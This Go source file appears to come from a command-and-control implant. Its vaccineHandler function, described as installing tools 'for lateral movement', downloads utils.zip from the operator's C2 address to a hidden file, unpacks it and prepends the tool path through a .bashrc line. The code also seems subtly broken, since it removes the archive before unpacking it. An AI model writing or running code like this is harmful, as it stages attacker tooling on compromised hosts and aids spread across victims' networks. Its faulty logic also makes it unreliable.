package agent

/*
install tools to UtilsPath, for lateral movement
*/

import (
	"fmt"
	"log"
	"os"

	"github.com/mholt/archiver"
)

func vaccineHandler() string {
	log.Printf("Downloading utils.zip from %s", CCAddress+"utils.zip")
	err := DownloadViaCC(CCAddress+"utils.zip", AgentRoot+"/.vj8x8Verd.zip")
	out := "[+] Utils have been successfully installed"
	if err != nil {
		log.Print("Utils error: " + err.Error())
		out = "[-] Download error: " + err.Error()
	}
	_ = os.Remove(AgentRoot + "/.vj8x8Verd.zip")

	// unpack utils.zip to our PATH
	if !IsFileExist(UtilsPath) {
		if err = os.MkdirAll(UtilsPath, 0700); err != nil {
			log.Print(err)
			return fmt.Sprintf("mkdir: %v", err)
		}
	}
	if err = archiver.Unarchive(AgentRoot+"/.vj8x8Verd.zip", UtilsPath); err != nil {
		log.Printf("Unarchive: %v", err)
		return fmt.Sprintf("Unarchive: %v", err)
	}

	// update PATH in .bashrc
	err = AppendToFile(UtilsPath+"/.bashrc", fmt.Sprintf("export PATH=%s:$PATH", UtilsPath))
	if err != nil {
		log.Printf("Update bashrc: %v", err)
		out = fmt.Sprintf("Update bashrc: %v", err)
	}
	return out
}
